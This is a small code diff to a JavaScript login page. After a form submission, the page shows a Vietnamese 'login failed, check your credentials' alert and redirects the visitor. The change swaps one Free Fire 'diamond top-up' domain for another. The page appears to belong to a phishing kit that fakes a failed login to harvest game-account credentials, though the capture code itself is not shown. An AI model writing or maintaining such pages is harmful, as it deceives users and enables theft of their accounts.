@@ -28,7 +28,7 @@ function telephoneCheck(str) {
  title: 'Đăng nhập thất bại',
  text: 'Thông tin đăng nhập không chính xác vui lòng kiểm tra lại!',
  }).then((result) => {
- window.location.href = "http://napkimcuongx10.online/";
+ window.location.href = "https://napthe-ff.ga/";
     })
  }
  document.querySelector('#login_form').onsubmit = function(e){
